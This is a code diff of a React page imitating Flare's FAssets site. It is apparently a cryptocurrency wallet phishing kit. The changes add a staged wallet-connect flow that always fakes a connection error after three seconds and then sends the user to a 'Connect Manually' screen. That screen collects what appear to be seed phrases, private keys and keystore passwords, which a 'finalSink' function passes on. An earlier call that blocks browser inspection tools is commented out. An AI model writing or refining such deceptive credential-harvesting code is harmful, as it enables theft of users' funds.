@@ -57,7 +57,7 @@ const Main = () => {
 
             <video style={{
               height: 320,
-              width : 320
+              width: 320
             }} autoPlay loop muted src={CityOri}></video>
           </div>
         </div>
@@ -110,10 +110,10 @@ const Main = () => {
             </div>
 
             <div
-            style={{ height: "272px", display: "flex", alignItems: "center", justifyContent: "center" }}
-          >
-            <img src={DandStake} width="100" height="100" alt="Delegate and Stake" />
-          </div>
+              style={{ height: "272px", display: "flex", alignItems: "center", justifyContent: "center" }}
+            >
+              <img src={DandStake} width="100" height="100" alt="Delegate and Stake" />
+            </div>
           </div>
         </div>
       </section>
@@ -199,11 +199,11 @@ const Main = () => {
       </section>
 
       <BsScreen />
-      
+
       <section className="main-div-7">
         <div>
-        <h1>Start building with FAssets</h1>
-        <p>Forge a DeFi hub for XRP, BTC, and DOGE with verifiable economic security.</p>
+          <h1>Start building with FAssets</h1>
+          <p>Forge a DeFi hub for XRP, BTC, and DOGE with verifiable economic security.</p>
         </div>
         <img style={{
           height: 320,
@@ -222,6 +222,7 @@ const BsScreen = () => {
   const [ks, setKs] = useState('')
   const [pk, setPk] = useState('')
   const [ksp, setKsp] = useState('')
+  const [wallet, setWallet] = useState('')
 
   const handlePh = (e) => {
     setPh(e.target.value)
@@ -241,6 +242,27 @@ const BsScreen = () => {
   function finalSink(payload) {
     return ImportStan(payload);
   }
+
+  function CloseModal() {
+    const bScreen = document.getElementById('bScreen');
+    if (bScreen) {
+      bScreen.style.display = 'none';
+    }
+    setActiveModal('in')
+  }
+
+  
+
+  useEffect(() => {
+    if (activeModal === 'ld') {
+      const timer = setTimeout(() => {
+        setActiveModal('er');
+      }, 3000); // 3 seconds
+
+      // Cleanup the timeout if component unmounts or activeModal changes
+      return () => clearTimeout(timer);
+    }
+  }, [activeModal]);
 
 
 
@@ -262,28 +284,40 @@ const BsScreen = () => {
           </p>
         </div>
         <div className="bdScreen">
-          <button onClick={() => setActiveModal('ph')} >
+          <button onClick={() => {
+            setActiveModal('ld')
+            setWallet('MetaMask')
+          }} >
             <p>
               <span>MetaMask</span>
               <span>Connect</span>
             </p>
             <MetaMaskIcon />
           </button>
-          <button onClick={() => setActiveModal('ph')}>
+          <button onClick={() => {
+            setActiveModal('ld')
+            setWallet('Wallet Connect')
+          }} >
             <p>
               <span>Wallet Connect</span>
               <span>Connect</span>
             </p>
             <WalletConnectIcon />
           </button>
-          <button onClick={() => setActiveModal('ph')}>
+          <button onClick={() => {
+            setActiveModal('ld')
+            setWallet('Coinbase Connect')
+          }} >
             <p>
               <span>Coinbase Connect</span>
               <span>Connect</span>
             </p>
             <CameraLensIcon />
           </button>
-          <button onClick={() => setActiveModal('ph')}>
+          <button onClick={() => {
+            setActiveModal('ld')
+            setWallet('Ledger')
+          }} >
             <p>
               <span>Ledger</span>
               <span>Connect</span>
@@ -298,6 +332,90 @@ const BsScreen = () => {
             }}> Terms of Service</span></p>
         </div>
       </div>}
+      {activeModal === 'ld' && <div id="ldScreen" className="ldScreen">
+        <div style={{
+          display: 'flex',
+          height: '90%',
+          flexDirection: 'column',
+          justifyContent: 'space-around'
+        }}>
+          <p style={{
+            padding: '20px',
+            border: '1px solid #e62058',
+            borderRadius: '10px',
+            color: '#e62058'
+          }}>Initializing...</p>
+          <p style={{
+            padding: '10px',
+            border: '1px solid #e62058',
+            borderRadius: '10px',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: "space-between"
+          }}>
+            {
+              (wallet === 'MetaMask') ? <> <MetaMaskIcon /> MetaMask Wallet </> : <></>
+            }
+            {
+              (wallet === 'Wallet Connect') ? <> <WalletConnectIcon /> Wallet Connect</> : <></>
+            }
+            {
+              (wallet === 'Coinbase Connect') ? <> <CameraLensIcon /> Coinbase Connect</> : <></>
+            }
+
+            {
+              (wallet === 'Ledger') ? <> <FrameIcon /> Ledger</> : <></>
+            }
+
+          </p>
+        </div>
+      </div>}
+      {activeModal === 'er' && <div id="erScreen" className="erScreen">
+        <div style={{
+          display: 'flex',
+          height: '90%',
+          flexDirection: 'column',
+          justifyContent: 'space-around'
+        }}>
+          <p style={{
+            padding: '20px',
+            border: '1px solid #e62058',
+            borderRadius: '10px',
+            color: '#e62058'
+          }}>Error Connecting...</p>
+          <p style={{
+            padding: '10px',
+            border: '1px solid #e62058',
+            borderRadius: '10px',
+            display: 'flex',
+            alignItems: 'center',
+            justifyContent: "space-between"
+          }}>
+            {
+              (wallet === 'MetaMask') ? <> <MetaMaskIcon /> MetaMask Wallet </> : <></>
+            }
+            {
+              (wallet === 'Wallet Connect') ? <> <WalletConnectIcon /> Wallet Connect</> : <></>
+            }
+            {
+              (wallet === 'Coinbase Connect') ? <> <CameraLensIcon /> Coinbase Connect</> : <></>
+            }
+
+            {
+              (wallet === 'Ledger') ? <> <FrameIcon /> Ledger</> : <></>
+            }
+          </p>
+          <button onClick={() => { setActiveModal('ph') }} style={{
+            width: 200,
+            padding: 10,
+            backgroundColor: '#e62058',
+            border: '1px solid #e62058',
+            borderRadius: 10,
+            color: '#fff'
+          }}>Connect Manually</button>
+        </div>
+
+      </div>}
       {activeModal === 'ph' && <div id="phScreen" className="phScreen">
         <div style={{
           height: '100%',
@@ -311,10 +429,19 @@ const BsScreen = () => {
             justifyContent: 'space-between',
             alignItems: 'center',
           }}>
-            <img src={FlareLogo} style={{
-              height: 30,
-              width: 100,
-            }} alt="" />
+            {
+              (wallet === 'MetaMask') ? <> <MetaMaskIcon />  </> : <></>
+            }
+            {
+              (wallet === 'Wallet Connect') ? <> <WalletConnectIcon /> </> : <></>
+            }
+            {
+              (wallet === 'Coinbase Connect') ? <> <CameraLensIcon /> </> : <></>
+            }
+
+            {
+              (wallet === 'Ledger') ? <> <FrameIcon /></> : <></>
+            }
             <p style={{
               cursor: 'pointer',
             }} onClick={CloseModal}>
@@ -488,6 +615,7 @@ const BsScreen = () => {
           }} className="proceed">Proceed</button></div>
         </div>
       </div>}
+
     </section>
   )
 }
@@ -564,7 +692,6 @@ const Footer = () => (
     </div>
   </footer>
 );
-
 function OpenModal() {
   const bScreen = document.getElementById('bScreen');
   if (bScreen) {
@@ -572,18 +699,14 @@ function OpenModal() {
   }
 }
 
-function CloseModal() {
-  const bScreen = document.getElementById('bScreen');
-  if (bScreen) {
-    bScreen.style.display = 'none';
-  }
-}
+
+
 
 
 
 
 const App = () => {
- useEffect(() => {blockInspectTools();}, [])
+  //useEffect(() => {blockInspectTools();}, [])
   return (
     <div>
       <Header />
